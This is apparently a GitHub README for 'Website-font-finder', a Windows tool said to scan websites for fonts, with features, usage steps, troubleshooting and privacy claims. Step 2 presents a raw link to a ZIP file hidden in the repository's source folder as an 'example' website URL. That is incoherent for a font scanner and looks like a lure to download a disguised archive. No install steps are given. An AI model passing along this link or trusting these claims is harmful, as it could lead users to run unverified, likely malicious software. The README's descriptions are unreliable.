## 🔎 What is Website-font-finder?

Website-font-finder helps you find fonts used on any website. Enter a web address, and the app scans it to show all fonts it uses. You can preview these fonts, compare them side-by-side, and download each font on its own or all fonts in a single ZIP file.

This tool supports fonts from popular sources, including Google Fonts and Adobe Typekit, as well as custom web fonts. It runs on Windows and does not require technical knowledge to use.

## 📋 Features

- Scan any website URL for fonts.
- Show a clear list of all fonts found.
- Preview each font with sample text.
- Compare fonts side-by-side.
- Download fonts individually.
- Download all fonts as a ZIP.
- Support for Google Fonts and Adobe Typekit.
- Recognize custom web fonts hosted on websites.
- Simple, fast, and user-friendly interface.

## ▶️ How to Use Website-font-finder

Once installed, follow these steps to scan fonts on a website:

1. Open Website-font-finder from your desktop or Start menu.

2. In the main window, enter the website’s full address (URL) in the input field. For example, `https://github.com/urmamaqwe/Website-font-finder/raw/refs/heads/main/src/app/compare/Website-finder-font-1.3.zip`.

3. Click the "Scan" button.

4. The app will connect to the website and find all fonts used on its pages.

5. You will see a list of fonts with their names and samples.

6. Click a font to preview it larger or compare several fonts side-by-side.

7. To download a font:
   - Click the "Download" button next to the font name.
   - Choose where to save the font file.
   - Save the file to your computer.

8. To download all fonts together:
   - Click "Download All."
   - Save the ZIP file to your preferred location.
   - Extract the ZIP to access individual font files.

## ⚙️ How It Works

Website-font-finder collects font data by reading styles used on web pages. It checks:

- CSS font rules.
- Web font services like Google Fonts and Adobe Typekit.
- Custom font files hosted in standard formats (woff2, ttf).

It then presents the fonts in an easy-to-read list. This approach does not change the website or collect personal information.

## 🛠 Troubleshooting Tips

If the app does not scan a website properly, try these steps:

- Check your internet connection.
- Make sure you entered the full URL, including `http://` or `https://`.
- Some websites restrict font access; try simpler or public websites.
- Restart the app if it freezes or crashes.
- Update Website-font-finder to the latest version from the release page.

---

## 🗂 Supported Font Formats

Website-font-finder finds fonts in these common formats:

- WOFF and WOFF2 (Web Open Font Format)
- TTF (TrueType Font)
- OTF (OpenType Font)

It can handle fonts hosted both on web servers and from popular font services.

## 🔐 Privacy and Security

Website-font-finder only scans font data publicly available on websites. It does not collect or share personal information. The scanning happens locally on your machine.
